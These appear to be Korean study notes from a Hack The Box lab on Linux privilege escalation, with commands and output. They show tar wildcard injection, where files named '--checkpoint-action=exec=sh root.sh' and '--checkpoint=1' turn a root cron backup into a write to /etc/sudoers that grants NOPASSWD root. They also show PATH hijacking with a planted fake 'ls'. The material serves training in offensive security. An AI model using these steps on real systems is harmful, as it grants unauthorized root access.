### Wildcard Abuse
`*` : An asterisk that can match any number of characters in a file name.
`?`: Matches a single character.
`[ ]`: Brackets enclose characters and can match any single one at the defined position.
`~`: A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory.
`-` : A hyphen within brackets will denote a range of characters.

**tar 명령어 옵션**
```jsx
htb_student@NIX02:~$ man tar

<SNIP>
Informative output
       --checkpoint[=N]
              Display progress messages every Nth record (default 10).

       --checkpoint-action=ACTION
              Run ACTION on each checkpoint.
```

**cron job 에서 사용하는 와일드카드 확인**
```jsx
#
#
mh dom mon dow command
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

**제한없는 sudoers에 우리를 추가하도록 조작**
```jsx
htb-student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
htb-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
htb-student@NIX02:~$ echo "" > --checkpoint=1
```

**파일 생성 확인**
```jsx
htb-student@NIX02:~$ ls -la

total 56
drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint=1
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
-rw-rw-r--  1 htb-student htb-student   60 Aug 31 23:11 root.sh
```

**sudo 권한 조작된 것을 확인**
```jsx
htb-student@NIX02:~$ sudo -l

Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: ALL
```



### PATH
PATH는 실행 파일을 찾을 수 있는 디렉토리 집합을 정의하는 환경 변수이다. 계정의 PATH 변수는 절대 경로를 지정하지 않고도 명령을 실행할 수 있도록 한다.

**PATH 예시**

```jsx
htb_student@NIX02:~$ echo $PATH

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

`PATH=.:$PATH` 를 입력하고 `export PATH`를 한다면, 기존의 정상적인 바이너리를 악의적인 바이너리로 바꿔칠 수 있다.

**악의적인 ls 예시**

```jsx
htb_student@NIX02:~$ PATH=.:${PATH}
htb_student@NIX02:~$ export PATH
htb_student@NIX02:~$ echo $PATH

.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

htb_student@NIX02:~$ touch ls
htb_student@NIX02:~$ echo 'echo "PATH ABUSE!!"' > ls
htb_student@NIX02:~$ chmod +x ls
htb_student@NIX02:~$ ls

PATH ABUSE!!
```


